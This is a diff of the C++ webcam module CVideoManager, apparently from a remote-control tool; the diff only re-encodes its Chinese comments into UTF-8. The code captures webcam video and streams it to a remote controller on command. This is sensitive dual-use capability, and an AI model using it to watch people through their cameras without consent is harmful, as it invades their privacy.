@@ -1,4 +1,4 @@
-// VideoManager.cpp: implementation of the CVideoManager class.
+﻿// VideoManager.cpp: implementation of the CVideoManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -51,9 +51,9 @@ void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	case COMMAND_NEXT:
 		NotifyDialogIsOpen();
 		break;
-	case COMMAND_WEBCAM_ENABLECOMPRESS: // Ҫ������ѹ��
+	case COMMAND_WEBCAM_ENABLECOMPRESS: // 要求启用压缩
 		{
-			// �����������ʼ��������������ѹ������
+			// 如果解码器初始化正常，就启动压缩功能
 #ifndef MY_TEST
 			if (m_pVideoCodec)
 				InterlockedExchange((LPLONG)&m_bIsCompress, true);
@@ -175,7 +175,7 @@ void CVideoManager::ResetScreen(int nWidth, int nHeight)
 	WaitForSingleObject(m_hWorkThread, INFINITE);
 	CloseHandle(m_hWorkThread);
     printf("[ResetScreen] : m_SelectedDevice = %d,nWidth = %d,nHeight = %d\n",m_SelectedDevice,nWidth, nHeight);	
-	// ������Ƶ��С
+	// 更新视频大小
 	m_nVedioWidth = nWidth;
 	m_nVedioHeight = nHeight;
 
@@ -205,7 +205,7 @@ DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
     printf("[CVideoManager] : Initialize end\n");
 	pThis->sendBITMAPINFO();
     printf("[CVideoManager] : sendBITMAPINFO end\n");
-	// �ȿ��ƶ˶Ի����
+	// 等控制端对话框打开
 	pThis->WaitForDialogOpen();
     printf("[CVideoManager] : WaitForDialogOpen end\n");
     pThis->StartCapture();
@@ -214,7 +214,7 @@ DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
 	{
 		pThis->sendNextScreen();
 	}
-	// �����Ѿ�����ʵ�����������µ���
+	// 销毁已经存在实例，方便重新调整
 	pThis->Destroy();
     printf("[CVideoManager] : workthread stop\n");
 	return 0;
@@ -294,35 +294,35 @@ bool CVideoManager::Initialize()
 	bRet = true;
 #else
 	bool	bRet = false;
-	// ����ʹ����
+	// 正在使用中
 	if (!CVideoCap::IsWebCam())
 		return false;
 
 	m_pVideoCap = new CVideoCap;
 
-	// ָ���˹̶���С
+	// 指定了固定大小
 	if (m_nVedioWidth && m_nVedioHeight)
 	{
 		bRet = m_pVideoCap->Initialize(m_nVedioWidth, m_nVedioHeight);
 	}
 	else
 	{
-		// ����H263������֧�ֵ����ִ�С,���ȿ���
+		// 测试H263编码器支持的两种大小,优先考虑
 		bRet = m_pVideoCap->Initialize(352, 288);
 		if (!bRet)
 			bRet = m_pVideoCap->Initialize(176, 144);
 
-		// ����ϵͳĬ�ϵ�
+		// 尝试系统默认的
 		if (!bRet)
 			bRet = m_pVideoCap->Initialize();
 
 	}
 
-	// ��Ҫ��ѹ������CVideoCap��ʼ��ʧ��
+	// 不要求压缩或者CVideoCap初始化失败
 	if (!bRet)
 		return bRet;
 
-	// ���⼸�ֽ������ѡһ��
+	// 从这几种解编器中选一种
 	DWORD	fccHandlerArray[] = 
 	{
 		859189837,	// Microsoft H.263 Video Codec
@@ -337,7 +337,7 @@ bool CVideoManager::Initialize()
 		if (!m_pVideoCodec->InitCompressor(m_pVideoCap->m_lpbmi, fccHandlerArray[i]))
 		{
 			delete m_pVideoCodec;
-			// ��NULL, ����ʱ�ж��Ƿ�ΪNULL���ж��Ƿ�ѹ��
+			// 置NULL, 发送时判断是否为NULL来判断是否压缩
 			m_pVideoCodec = NULL;
 		}
 		else
